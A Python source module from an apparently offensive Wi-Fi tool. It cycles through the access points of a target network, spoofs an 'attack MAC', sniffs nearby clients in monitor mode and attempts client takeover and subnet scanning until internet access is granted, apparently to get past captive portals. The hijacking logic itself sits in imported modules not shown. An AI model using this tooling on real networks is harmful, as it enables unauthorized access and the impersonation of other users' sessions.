"""
cafe_chameleon.modes.aggressive.runner - Sequential multi-BSSID exploration & scanning execution runner.
"""

import sys
import time

from cafe_chameleon.utils.signals import register_signal_handler, MainSkipInterrupt
from cafe_chameleon.ui.console import (
    log_info,
    log_plus,
    log_warning,
    log_main,
    set_main_status,
    log_hijack,
    clear_window,
    log_step,
    get_user_input
)
from cafe_chameleon.network.internet import has_internet
from cafe_chameleon.network.sysfs import wait_for_carrier
from cafe_chameleon.network.hijack import restore
from cafe_chameleon.network.mac import set_mac_address, get_attack_mac
from cafe_chameleon.utils.tracing import trace
from cafe_chameleon.network.nmcli import (
    get_active_profile,
    get_ssid_for_profile,
    scan_bssids_for_ssid,
    lock_bssid,
    restore_auto
)
from cafe_chameleon.scanners.detector import auto_detect_network_params
from cafe_chameleon.scanners.air import sniff_air_clients, is_monitor_mode_active, set_managed_mode

from .selector import display_and_select_bssid
from .air_target_handler import filter_valid_air_clients, test_air_client_targets


def run_scan_wrapper(args, quiet_header=False):
    """Deferred import to avoid circular dependency with simple scan runner."""
    from cafe_chameleon.modes.simple import run_simple
    return run_simple(args, quiet_header=quiet_header)


def run_aggressive(args) -> bool:
    """
    Main subcommand handler for Aggressive mode.
    Connects to each available BSSID for the target SSID one by one,
    checking for internet access or scanning until internet access is granted.
    Supports --air over-the-air 802.11 monitor mode client discovery & direct takeover.
    """
    register_signal_handler()

    profile = getattr(args, "profile", None) or get_active_profile()
    if not profile:
        log_main("[-] Error: Could not auto-detect active Wi-Fi profile. Specify -p/--profile.")
        sys.exit(1)

    ssid = get_ssid_for_profile(profile)
    if not ssid:
        log_main(f"[-] Error: Could not determine SSID for profile '{profile}'.")
        sys.exit(1)

    interface = getattr(args, "interface", None) or "wlan0"
    trace(f"[FEATURE] Initializing Aggressive exploration mode on interface {interface} (Profile: '{profile}', SSID: '{ssid}')")

    air_arg = getattr(args, "air", None)
    is_air = air_arg is not None
    air_duration = 25

    if is_air:
        if isinstance(air_arg, int) and air_arg > 0:
            air_duration = air_arg
        elif sys.stdin.isatty():
            try:
                val = get_user_input("Enter duration in seconds to listen in monitor mode [default: 25]: ").strip()
                if val.isdigit() and int(val) > 0:
                    air_duration = int(val)
            except (KeyboardInterrupt, EOFError):
                pass

    status_str = f"Air Sniffing ({air_duration}s)" if is_air else "Active Exploration"
    set_main_status(interface=interface, profile=profile, ssid=ssid, status=status_str)

    # 1. Initial internet check
    if has_internet():
        if not getattr(args, "force", False):
            log_main("[+] Internet online.")
            return True
        else:
            log_main("[!] Internet online (--force enabled). Continuing exploration...")

    # 2. Discover BSSIDs for the SSID
    bssids = scan_bssids_for_ssid(ssid)
    if not bssids:
        log_main(f"[-] No BSSIDs found for SSID '{ssid}'.")
        return False

    log_main(f"[+] Discovered {len(bssids)} BSSID(s) for '{ssid}'")

    # 3. If --air mode is enabled, sniff over-the-air Dot11 frames in monitor mode FIRST
    air_clients_map = {}
    if is_air:
        target_bssid_list = [b["bssid"] for b in bssids]
        target_channel_list = [b["chan"] for b in bssids if b.get("chan")]
        threshold_val = getattr(args, "threshold", getattr(args, "bssid_threshold", 10))
        air_clients_map = sniff_air_clients(
            target_bssid_list,
            interface=interface,
            duration=air_duration,
            target_channels=target_channel_list,
            bssids=bssids,
            bssid_threshold=threshold_val
        )
        if is_monitor_mode_active(interface):
            set_managed_mode(interface)
        set_main_status(status="Active Exploration")

    # 4. Display ranked BSSIDs & handle manual selection
    prioritize_clients = bool(
        getattr(args, "clients", False)
        or getattr(args, "prioritize_clients", False)
    )
    bssids = display_and_select_bssid(
        bssids,
        air_clients_map,
        getattr(args, "select_bssid", False),
        prioritize_clients=prioritize_clients
    )

    tried_macs = set()
    last_skip_time = 0

    for idx, item in enumerate(bssids, start=1):
        target_bssid = item["bssid"]
        signal_pct = item["signal"]
        chan = item["chan"]
        target_sec = item.get("security", "")

        try:
            clear_window("hijack")
            clear_window("scan")

            msg = f"[{idx}/{len(bssids)}] Target: {target_bssid} (Sig: {signal_pct}%, Ch: {chan})"
            log_info(msg)
            log_main(f"\n{msg}")

            if is_monitor_mode_active(interface):
                set_managed_mode(interface)

            attack_mac = get_attack_mac(interface)
            trace(f"[FEATURE] Applying attack MAC {attack_mac} before locking to BSSID {target_bssid}")
            set_mac_address(interface, attack_mac, profile=profile)

            if not lock_bssid(target_bssid, profile):
                log_main(f"[!] Skipping BSSID {target_bssid} (lock failed).")
                continue

            wait_for_carrier(interface, timeout=6.0)

            if has_internet():
                log_main(f"\033[92m[+] SUCCESS! Internet verified on {target_bssid}!\033[0m")
                if not getattr(args, "force", False):
                    return True
                else:
                    log_main(f"[!] --force enabled. Continuing attack on {target_bssid}...")

            bssid_air_clients = air_clients_map.get(target_bssid.lower(), {})
            auto_params = auto_detect_network_params(target_iface=interface)
            new_air_clients = filter_valid_air_clients(bssid_air_clients, tried_macs, auto_params, bssids)

            if new_air_clients:
                success_air, stop_early = test_air_client_targets(
                    new_air_clients, interface, target_bssid, chan, profile, tried_macs, auto_params, args, security=target_sec
                )
                if stop_early or (success_air and not getattr(args, "force", False)):
                    return True

            if is_monitor_mode_active(interface):
                set_managed_mode(interface)

            log_step(f"Scanning subnet on BSSID {target_bssid}...")
            log_main(f"  -> Scanning subnet on BSSID {target_bssid}...")
            log_hijack(f"[*] Scanning subnet on BSSID {target_bssid}...")
            setattr(args, "interface", interface)
            success = run_scan_wrapper(args, quiet_header=True)

            if success or (has_internet() and not getattr(args, "force", False)):
                log_plus(f"SUCCESS! Internet access granted via {target_bssid}!")
                log_main(f"\033[92m[+] SUCCESS! Internet access granted via {target_bssid}!\033[0m")
                if not getattr(args, "force", False):
                    return True

            log_warning(f"No internet on BSSID {target_bssid}. Moving next...")
            log_main(f"  [-] No internet on BSSID {target_bssid}. Moving next...")

        except (KeyboardInterrupt, MainSkipInterrupt):
            now = time.time()
            if now - last_skip_time < 1.5:
                log_warning("Double Ctrl+C. Exiting...")
                log_main("[-] Double Ctrl+C. Exiting...")
                if is_monitor_mode_active(interface):
                    set_managed_mode(interface)
                restore_auto(profile)
                raise

            last_skip_time = now
            log_warning(f"Skipping BSSID {target_bssid} (Ctrl+C)...")
            log_main(f"\033[93m[-] Skipping BSSID {target_bssid} (Ctrl+C)...\033[0m")
            try:
                if is_monitor_mode_active(interface):
                    set_managed_mode(interface)
                auto_params = auto_detect_network_params(target_iface=interface)
                gw_ip = auto_params.get("gateway_ip", "")
                local_mac = auto_params.get("local_mac", "")
                ipmask = auto_params.get("cidr", "")
                broadcast = auto_params.get("broadcast", "")
                if interface and local_mac and ipmask:
                    restore(interface, local_mac, ipmask, broadcast, gw_ip, profile=profile)
            except Exception:
                pass
            time.sleep(0.5)
            continue

    log_warning("Aggressive completed all BSSIDs without internet access.")
    log_main("[-] Aggressive completed all BSSIDs without internet access.")
    log_step("Restoring auto-roaming on profile...")
    if is_monitor_mode_active(interface):
        set_managed_mode(interface)
    restore_auto(profile)
    return False
